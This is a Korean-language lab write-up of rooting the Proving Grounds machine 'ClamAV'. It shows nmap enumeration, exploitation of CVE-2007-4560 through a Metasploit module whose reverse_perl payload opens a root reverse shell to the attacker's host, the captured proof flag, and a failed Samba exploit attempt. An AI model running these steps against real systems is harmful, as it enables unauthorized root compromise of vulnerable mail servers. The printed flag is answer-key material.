# ClamAV

**Platform:** Offensive Security Proving Grounds (PG Practice) **IP:** 192.168.55.42 **Difficulty:** Easy **OS:** Linux (Debian Sarge) **Type:** Boot2Root **Date:** 2026-03-30 **Status:** ✅ Rooted

---

## Tags

`#pgpractice` `#linux` `#clamav` `#smtp` `#milter` `#metasploit` `#rce` `#oscp`

---

## Summary

ClamAV milter 서비스의 알려진 RCE 취약점을 이용하여 root shell을 획득한 머신. Sendmail 8.13.4와 연동된 ClamAV milter가 root 권한으로 실행되고 있어, 별도의 PrivEsc 없이 초기 접근만으로 root flag 획득 가능.

---

## Enumeration

### Port Scan

```bash
nmap -p- --min-rate 10000 -T4 192.168.55.42
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
139/tcp   open  netbios-ssn
199/tcp   open  smux
445/tcp   open  microsoft-ds
60000/tcp open  unknown
```

### Service Scan

```bash
nmap -sC -sV -p 22,25,80,139,199,445,60000 --min-rate 10000 -T4 192.168.55.42
```

|Port|Service|Version|
|---|---|---|
|22|SSH|OpenSSH 3.8.1p1 Debian|
|25|SMTP|Sendmail 8.13.4|
|80|HTTP|Apache 1.3.33|
|139/445|SMB|Samba 3.0.14a-Debian|
|199|SNMP|Linux SNMP multiplexer|
|60000|SSH|OpenSSH 3.8.1p1 (백도어 SSH)|

### Key Findings

- **Sendmail 8.13.4** + ClamAV milter → CVE-2007-4560 (blackhole mode RCE)
- **Samba 3.0.14a** → CVE-2007-2447 (username map script) — 시도했으나 실패
- OS가 매우 구버전 (Debian Sarge) → 다수의 known exploit 존재

---

## Exploitation

### Vulnerability

**ClamAV Milter Blackhole Mode RCE**

- Sendmail과 연동된 ClamAV milter가 blackhole 모드로 동작
- 악성 MAIL FROM 헤더를 통해 임의 명령 실행 가능
- milter 프로세스가 root 권한으로 실행 중 → 직접 root shell 획득

### Metasploit

```bash
msfconsole

use exploit/unix/smtp/clamav_milter_blackhole
set RHOSTS 192.168.55.42
set LHOST 192.168.49.55
set PAYLOAD cmd/unix/reverse_perl
exploit
```

> ⚠️ **Note:** PG Practice는 tun0 없음. LHOST는 eth0 IP인 `192.168.49.55` 사용. `cmd/unix/reverse_bash` 대신 `cmd/unix/reverse_perl` payload 사용 시 안정적으로 동작.

### Result

```
[*] Started reverse TCP handler on 192.168.49.55:4444
[*] Command shell session 1 opened (192.168.49.55:4444 → 192.168.55.42:32783)
```

---

## Post Exploitation

### Shell 확인

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

whoami
# root
```

### Flags

```bash
cat /root/proof.txt
# c14b0c94b2246ed6784a627da0962acd
```

|Flag|Location|Value|
|---|---|---|
|proof.txt|`/root/proof.txt`|`c14b0c94b2246ed6784a627da0962acd`|

---

## Failed Attempts

|Exploit|모듈|결과|원인 추정|
|---|---|---|---|
|Samba usermap_script|`exploit/multi/samba/usermap_script`|❌ No session|패치됐거나 설정 다름|
|ClamAV (reverse_bash payload)|`unix/smtp/clamav_milter_blackhole`|❌ No session|bash 없음 또는 버전 문제|

---

## Lessons Learned

- PG Practice에서는 **tun0 대신 eth0 IP** (192.168.49.x 대역) 사용
- Metasploit에서 payload 복붙 시 **인코딩 문제**로 Unknown command 발생 가능 → 직접 타이핑
- default payload(`reverse_bash`)가 안 될 경우 **`reverse_perl`** 시도
- Samba exploit 실패 시 다른 벡터(SMTP/milter)로 pivot하는 사고방식 중요

---

## References

- [Exploit-DB: ClamAV Milter Blackhole Mode](https://www.exploit-db.com/exploits/4761)
- CVE-2007-4560
- Metasploit module: `exploit/unix/smtp/clamav_milter_blackhole`